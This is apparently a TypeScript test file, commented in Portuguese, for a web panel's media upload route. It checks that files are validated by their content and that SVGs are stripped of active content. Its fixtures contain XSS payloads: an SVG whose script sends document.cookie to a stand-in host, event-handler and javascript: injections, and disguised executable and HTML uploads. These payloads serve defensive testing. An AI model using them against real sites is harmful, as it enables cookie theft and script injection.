import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { createTestApi, registerAccount, type RegisteredAccount, type TestApi } from '../helpers/api.js';
import { jpegBytes, pdfBytes, pngBytes } from '../helpers/media.js';

/**
 * O upload do painel decide pelo conteúdo, não pelo rótulo.
 *
 * ## O defeito
 *
 * A rota conferia apenas `file.type` -- o tipo que o navegador (ou quem monta
 * a requisição) resolveu declarar. Duas consequências:
 *
 * 1. qualquer arquivo rotulado `image/png` era gravado e servido como imagem;
 * 2. um SVG era gravado como veio, com `<script>`, `onload` e o que mais
 *    trouxesse. A importação de sites já limpava SVG; o upload manual, não.
 *
 * ## O que estes testes garantem
 *
 * - O que não é um dos tipos aceitos é recusado, seja qual for o rótulo.
 * - SVG é gravado limpo, nunca o original.
 * - Conteúdo que não bate com o tipo declarado é recusado, mesmo quando os
 *   dois são tipos aceitos.
 * - Nenhum arquivo legítimo deixou de ser aceito, e os limites de tamanho são
 *   os mesmos.
 */

let api: TestApi;
let conta: RegisteredAccount;

beforeAll(async () => {
  api = await createTestApi();
});

afterAll(async () => {
  await api.close();
});

beforeEach(async () => {
  await api.reset();
  conta = await registerAccount(api, { email: 'dona@padaria.com.br', companyName: 'Padaria Central' });
});

function enviar(conteudo: BlobPart, nome: string, tipo: string) {
  const form = new FormData();
  form.set('file', new File([conteudo], nome, { type: tipo }));
  return conta.client.request('POST', `/api/tenants/${conta.tenantId}/media`, { formData: form });
}

/** O que foi de fato gravado no armazenamento (há um arquivo só por teste). */
function gravado(): string {
  const [corpo] = [...api.blobBodies.values()];
  expect(corpo, 'nenhum arquivo foi gravado').toBeDefined();
  return Buffer.from(corpo!).toString('utf-8');
}

describe('rótulo que não bate com o conteúdo', () => {
  it('recusa um executável rotulado como PNG', async () => {
    // Cabeçalho de executável do Windows ("MZ"), com nome e tipo de imagem.
    const executavel = new Uint8Array(2048);
    executavel.set([0x4d, 0x5a, 0x90, 0x00]);

    const resposta = await enviar(executavel, 'foto.png', 'image/png');

    expect(resposta.status).toBe(415);
    expect(api.blobFiles.size).toBe(0);
  });

  it('recusa HTML rotulado como JPG', async () => {
    const resposta = await enviar(
      '<!doctype html><html><body><script>alert(1)</script></body></html>',
      'foto.jpg',
      'image/jpeg',
    );
    expect(resposta.status).toBe(415);
    expect(api.blobFiles.size).toBe(0);
  });

  it('recusa bytes vazios de sentido rotulados como imagem', async () => {
    const resposta = await enviar(new Uint8Array(2048), 'foto.jpg', 'image/jpeg');
    expect(resposta.status).toBe(415);
    expect(api.blobFiles.size).toBe(0);
  });

  it('recusa também a divergência entre dois tipos aceitos, e diz o que fazer', async () => {
    // JPG salvo com nome de PNG: inocente na maioria das vezes, mas um
    // arquivo que se apresenta como uma coisa e é outra não é gravado.
    const resposta = await enviar(jpegBytes(), 'foto.png', 'image/png');

    expect(resposta.status).toBe(415);
    expect(resposta.errorMessage).toMatch(/não corresponde ao tipo informado/i);
    expect(api.blobFiles.size).toBe(0);
  });
});

describe('SVG', () => {
  const svgComScript = `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="alert(document.cookie)">
  <script>fetch('https://exemplo.invalid/?c=' + document.cookie)</script>
  <foreignObject><iframe src="https://exemplo.invalid"></iframe></foreignObject>
  <a href="javascript:alert(1)"><circle cx="5" cy="5" r="4" fill="#0a7"/></a>
</svg>`;

  it('grava o desenho e remove tudo o que executa', async () => {
    const resposta = await enviar(svgComScript, 'logo.svg', 'image/svg+xml');

    expect(resposta.status, resposta.errorMessage ?? '').toBe(201);
    const salvo = gravado();

    // O desenho ficou...
    expect(salvo).toContain('<circle');
    // ...e nada do que executa.
    expect(salvo).not.toMatch(/<script/i);
    expect(salvo).not.toMatch(/onload/i);
    expect(salvo).not.toMatch(/foreignObject/i);
    expect(salvo).not.toMatch(/javascript:/i);
    expect(salvo).not.toContain('exemplo.invalid');

    // O tamanho registrado é o do arquivo gravado, não o do enviado.
    expect(resposta.body.asset.sizeBytes).toBe(Buffer.byteLength(salvo, 'utf-8'));
    expect(resposta.body.asset.sizeBytes).toBeLessThan(Buffer.byteLength(svgComScript, 'utf-8'));
  });

  it('SVG rotulado como PNG não entra pela porta dos fundos', async () => {
    // Sem a conferência do conteúdo, este era o desvio óbvio da limpeza:
    // declarar outro tipo e o SVG seria gravado como veio.
    const resposta = await enviar(svgComScript, 'logo.png', 'image/png');

    expect(resposta.status).toBe(415);
    expect(api.blobFiles.size).toBe(0);
  });

  it('remove atributos de evento mesmo sem nenhum <script>', async () => {
    const resposta = await enviar(
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="alert(1)">'
        + '<rect width="10" height="10" onclick="alert(2)" onmouseover="alert(3)" fill="#000"/></svg>',
      'botao.svg',
      'image/svg+xml',
    );

    expect(resposta.status, resposta.errorMessage ?? '').toBe(201);
    const salvo = gravado();
    expect(salvo).toContain('<rect');
    expect(salvo).not.toMatch(/\son[a-z]+\s*=/i);
    expect(salvo).not.toContain('alert');
  });

  it('recusa o SVG que não tem desenho nenhum além de script', async () => {
    const resposta = await enviar(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
      'vazio.svg',
      'image/svg+xml',
    );
    expect(resposta.status).toBe(415);
    expect(api.blobFiles.size).toBe(0);
  });

  it('um SVG comum passa sem perder o desenho', async () => {
    const limpo =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 2h20v20H2z" fill="#123456"/></svg>';
    const resposta = await enviar(limpo, 'icone.svg', 'image/svg+xml');

    expect(resposta.status, resposta.errorMessage ?? '').toBe(201);
    expect(gravado()).toContain('M2 2h20v20H2z');
  });
});

describe('arquivos legítimos continuam aceitos', () => {
  const gif = new Uint8Array(64);
  gif.set(Array.from('GIF89a', (letra) => letra.charCodeAt(0)));

  const webp = new Uint8Array(64);
  webp.set(Array.from('RIFF', (letra) => letra.charCodeAt(0)), 0);
  webp.set(Array.from('WEBP', (letra) => letra.charCodeAt(0)), 8);

  const avif = new Uint8Array(64);
  avif.set(Array.from('ftypavif', (letra) => letra.charCodeAt(0)), 4);

  it.each([
    ['JPG', jpegBytes(), 'foto.jpg', 'image/jpeg'],
    ['PNG', pngBytes(), 'foto.png', 'image/png'],
    ['GIF', gif, 'animacao.gif', 'image/gif'],
    ['WEBP', webp, 'foto.webp', 'image/webp'],
    ['AVIF', avif, 'foto.avif', 'image/avif'],
    ['PDF', pdfBytes(), 'cardapio.pdf', 'application/pdf'],
  ] as const)('%s', async (_nome, conteudo, arquivo, tipo) => {
    const resposta = await enviar(conteudo, arquivo, tipo);

    expect(resposta.status, resposta.errorMessage ?? '').toBe(201);
    expect(resposta.body.asset.mimeType).toBe(tipo);
    expect(api.blobFiles.size).toBe(1);
  });
});

describe('limites preservados', () => {
  it('o teto por arquivo continua o mesmo, e vale antes da conferência do conteúdo', async () => {
    const grande = jpegBytes(4 * 1024 * 1024 + 1);
    const resposta = await enviar(grande, 'enorme.jpg', 'image/jpeg');
    expect(resposta.status).toBe(413);
    expect(api.blobFiles.size).toBe(0);
  });

  it('tipo fora da lista continua recusado pelo rótulo', async () => {
    const resposta = await enviar('<?php echo 1; ?>', 'script.php', 'application/x-php');
    expect(resposta.status).toBe(415);
    expect(api.blobFiles.size).toBe(0);
  });
});
